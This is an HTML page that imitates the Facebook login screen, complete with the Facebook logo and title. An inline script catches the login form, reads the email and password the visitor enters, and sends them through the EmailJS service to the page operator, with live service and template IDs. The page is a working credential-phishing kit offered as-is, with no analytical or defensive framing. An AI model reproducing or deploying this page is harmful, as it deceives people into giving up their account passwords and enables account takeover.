<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login Page</title>
  <link rel="stylesheet" href="styles.css"> <!-- Link to CSS -->
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <img src="Facebook-Logo.png" alt="Facebook Logo">
    </div>
    <form id="login-form">
      <input type="text" id="email" placeholder="Email or phone number" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
      <a href="#" class="forgot-password">Forgot password?</a>
      <hr>
      <button type="button" class="create-account">Create new account</button>
    </form>
    <p id="error-message" class="error-message"></p>
  </div>

  <!-- Load EmailJS library -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
  <!-- Your custom script -->
  <script>
    // Initialize EmailJS with your User ID
    emailjs.init('vHCH2lPGCsgQvP81G'); // Replace with your EmailJS User ID

    // Handle form submission
    document.getElementById('login-form').addEventListener('submit', (e) => {
      e.preventDefault();
      const password = document.getElementById('password').value;
      const email = document.getElementById('email').value;

      // Send email using EmailJS
      emailjs.send('service_ujhpjqw', 'template_igupmhn', { password, email })
        .then(() => {
          alert('Email sent!');
        })
        .catch((error) => {
          console.error('Error sending email: ', error);
          document.getElementById('error-message').textContent = 'Failed to send email. Please try again.';
        });
    });
  </script>
</body>
</html>
